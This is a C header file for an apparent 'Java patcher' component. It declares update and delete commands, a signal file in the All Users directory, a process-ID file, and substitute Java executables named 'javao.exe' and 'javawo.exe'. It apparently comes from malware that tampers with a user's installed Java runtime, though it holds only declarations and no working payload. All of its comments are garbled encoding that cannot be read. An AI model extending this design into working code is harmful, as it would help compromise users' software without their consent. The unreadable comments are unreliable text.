#ifndef		JAVS_PATCHERH
#define		JAVS_PATCHERH

#include "windows.h"

const char* GetJREPath();
const char UpdatePath[] = "UpdatePatch\0";
const char DeletePath[] = "deletepatch\0";

// ��� ����������� �����. ���� ������ ���������� � ����������
// ���������� ���� ������������� (WIN 7 -  c:\Users\All Users\
// ��� ������ � ������ ����� ������� ���� � ������ ������ ����������
// ������ �����
const char JavaPatcherSignalFile[] = "Pat.txt";


// ��� ����� ���� ������������ ���� ��������� ��� �������
// ���������� ��������� ����
const char JavaPatcherPidsFile[] = "wj.dat";


// ����� ������������ ���
const char Patched_Jawa_Name[]  = "javao.exe";
const char Patched_JawaW_Name[] = "javawo.exe";


bool ExecuteUpdatePathCommand(LPVOID Manager, PCHAR Command, PCHAR Args);
bool ExecuteDeletePathCommand(LPVOID Manager, PCHAR Command, PCHAR Args);

bool WINAPI ClearAndDel( LPVOID lpData );

DWORD WINAPI Run_Path(LPVOID lpData);

//-------------------------------------------------------------
// JavaPatcherSignal - ������� ������������� � �������������
//                     ������� ������
//-------------------------------------------------------------
void  JavaPatcherSignal();

#endif		//java_patcher
